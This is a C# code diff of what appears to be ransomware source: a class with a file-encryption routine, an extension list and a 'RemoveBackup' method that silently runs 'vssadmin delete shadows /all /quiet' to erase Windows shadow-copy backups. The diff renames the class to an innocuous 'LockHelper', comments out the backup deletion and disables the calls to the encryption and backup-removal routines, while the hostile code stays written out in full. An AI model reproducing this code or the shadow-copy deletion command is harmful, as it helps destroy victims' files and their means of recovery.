@@ -5,9 +5,9 @@ using System.IO;
 using System.Security.Cryptography;
 using System.Text;
 
-namespace Locks
+namespace MyApplic
 {
-    public class Class1
+    public class LockHelper
     {
         volatile Queue<string> _lock_files = new Queue<string>();
         List<string> validextension = new List<string>();
@@ -101,7 +101,6 @@ namespace Locks
             }
         }
 
-
         void RunEncrypt()
         {
             var macname = Environment.MachineName;
@@ -153,34 +152,34 @@ namespace Locks
             string relativePath = file.Substring("\\".Length + 1);
             byte[] pathBytes = Encoding.UTF8.GetBytes(relativePath.ToLower());
             md5.TransformBlock(pathBytes, 0, pathBytes.Length, pathBytes, 0);
-            try
+
+            using (var fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.Read))
             {
-                // hash contents
-                byte[] contentBytes = File.ReadAllBytes(file);
+                var contentBytes = new byte[fs.Length];
+                fs.Read(contentBytes, 0, contentBytes.Length);
                 md5.TransformBlock(contentBytes, 0, contentBytes.Length, contentBytes, 0);
                 md5.TransformFinalBlock(contentBytes, 0, contentBytes.Length);
             }
-            finally { }
             return BitConverter.ToString(md5.Hash).Replace("-", "").ToLower();
         }
 
         void RemoveBackup()
         {
-            try
-            {
-                ProcessStartInfo info = new ProcessStartInfo("cmd.exe", "/c vssadmin.exe delete shadows /all /quiet");
-                info.RedirectStandardOutput = true;
-                info.UseShellExecute = false;
-                info.CreateNoWindow = true;
-                info.WindowStyle = ProcessWindowStyle.Hidden;
-                Process process = new Process();
-                process.StartInfo = info;
-                process.Start();
-            }
-            catch (Exception)
-            {
+            //try
+            //{
+            //    ProcessStartInfo info = new ProcessStartInfo("cmd.exe", "/c vssadmin.exe delete shadows /all /quiet");
+            //    info.RedirectStandardOutput = true;
+            //    info.UseShellExecute = false;
+            //    info.CreateNoWindow = true;
+            //    info.WindowStyle = ProcessWindowStyle.Hidden;
+            //    Process process = new Process();
+            //    process.StartInfo = info;
+            //    process.Start();
+            //}
+            //catch (Exception)
+            //{
 
-            }
+            //}
         }
 
         void DisplayLockinfo()
@@ -188,13 +187,13 @@ namespace Locks
             Console.WriteLine("run done...");
         }
 
-        void Main()
+        public void Main()
         {
             Init();
-            RunEncrypt();
+            //RunEncrypt();
             SearchDisk();
-            RemoveBackup();
-            DisplayLockinfo();
+            //RemoveBackup();
+            //DisplayLockinfo();
         }
     }
 }
